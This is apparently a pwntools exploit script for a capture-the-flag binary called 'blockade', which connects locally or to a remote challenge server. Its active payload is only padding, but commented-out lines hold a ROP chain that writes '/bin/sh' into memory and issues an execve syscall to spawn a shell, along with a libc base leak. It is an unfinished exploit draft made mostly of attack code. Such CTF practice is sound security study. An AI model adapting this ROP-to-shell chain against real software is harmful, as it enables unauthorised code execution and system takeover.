import sys
from struct import *
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./blockade')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./blockade')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29112)
			elf=ELF('./blockade')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')




		gdb.attach(io)
		p = 'a'*0x10
		# p += p64(0x00000000004100a3) # pop rsi ; ret
		# p += p64(0x00000000006b90e0) # @ .data
		# p += p64(0x00000000004150a4) # pop rax ; ret
		# p += '/bin/sh\x00'
		# p += p64(0x000000000047eeb1) # mov qword ptr [rsi], rax ; ret
		# p += p64(0x0000000000400686) # pop rdi ; ret
		# p += p64(0x00000000006b90e0) # @ .data
		# p += p64(0x000000000044b879) # pop rsi ; ret
		# p += p64(0)
		# p += p64(0)
		# p += p64(0x00000000004150a4) # pop rax ; ret
		# p += p64(0x3b)
		# p += p64(0x00000000004748a5) # syscall ; ret
		#p += p64(0x400b4d)

		io.send(p)


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue